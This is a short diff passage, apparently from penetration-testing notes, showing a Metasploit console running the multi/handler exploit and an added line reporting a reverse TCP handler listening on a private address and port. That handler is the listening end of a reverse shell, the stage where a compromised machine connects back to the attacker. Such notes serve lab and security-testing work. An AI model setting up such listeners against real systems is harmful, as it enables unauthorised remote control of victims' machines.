@@ -160,3 +160,4 @@ Exploit target:
 
 
 msf6 exploit(multi/handler) > exploit
+[*] Started reverse TCP handler on 172.22.138.36:1010
